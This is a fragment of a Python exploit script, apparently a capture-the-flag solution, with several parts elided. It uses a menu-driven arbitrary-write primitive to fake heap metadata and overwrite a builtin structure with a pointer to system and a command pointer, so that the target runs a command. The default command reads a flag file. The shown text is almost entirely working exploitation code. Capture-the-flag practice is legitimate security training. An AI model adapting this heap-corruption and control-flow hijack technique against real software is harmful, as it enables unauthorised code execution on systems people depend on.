...
def magic_write(tube: Tube, addr: int, value: int) -> None:
    menu(tube, 5)
...
def run_exploit(tube: Tube, command: str) -> bytes:
    ...
    fake = meta - 0x20
    magic_write(tube, fake, meta)
    magic_write(tube, fake + 8, hdr2)
    magic_write(tube, meta + 0x10, fake)
    ...
    magic_write(tube, builtin, 0)
    magic_write(tube, builtin + 8, system)
    magic_write(tube, builtin + 0x108, cmd_ptr)
    magic_write(tube, head, builtin)
    magic_write(tube, slot_qword, 1 << 32)
...
def main() -> int:
    ...
    parser.add_argument(
        "--cmd",
        default="cat /flag 2>/dev/null || cat flag.txt 2>/dev/null; exit",
    )
